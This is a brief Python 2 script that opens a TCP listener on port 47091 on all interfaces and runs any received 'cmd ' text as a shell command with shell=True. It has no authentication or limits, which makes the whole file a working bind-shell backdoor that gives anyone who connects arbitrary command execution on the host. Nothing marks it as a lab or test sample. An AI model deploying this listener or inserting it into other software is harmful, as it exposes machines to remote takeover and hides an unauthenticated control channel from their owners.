#!/usr/bin/env python
# coding:utf-8


import time
import socket
import threading
import traceback
import subprocess


def parsecmd(strings):
    midsplit = str(strings).split(" ")
    if len(midsplit) >= 2 and midsplit[0] == "cmd":
        try:
            command = subprocess.Popen(strings[4:], shell=True)
            command.communicate()
            print "\n"
        except Exception, e:
            print e.message
            traceback.print_exc()


def recvdata(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', port))
    s.listen(1)
    print "[+] Server is running on port:%s at %s" % (str(port), time.strftime("%Y%m%d %H:%M:%S", time.localtime()))
    while True:
        mainsocket, mainhost = s.accept()
        print "[+] Connect success -> %s at %s" % (str(mainhost), time.strftime("%Y%m%d %H:%M:%S", time.localtime()))
        if mainhost:
            while True:
                data = mainsocket.recv(1024)
                if data:
                    print "[+] Receive:%s" % data
                    mainsocket.sendall("[Server]success")
                    parsecmd(data)
                if data == "close session":
                    mainsocket.close()
                    print "[+] Quit success"
                    break
            break


if __name__ == "__main__":
    # some public variable
    connPort = 47091
    onethreads = threading.Thread(target=recvdata, args=(connPort,))
    onethreads.start()
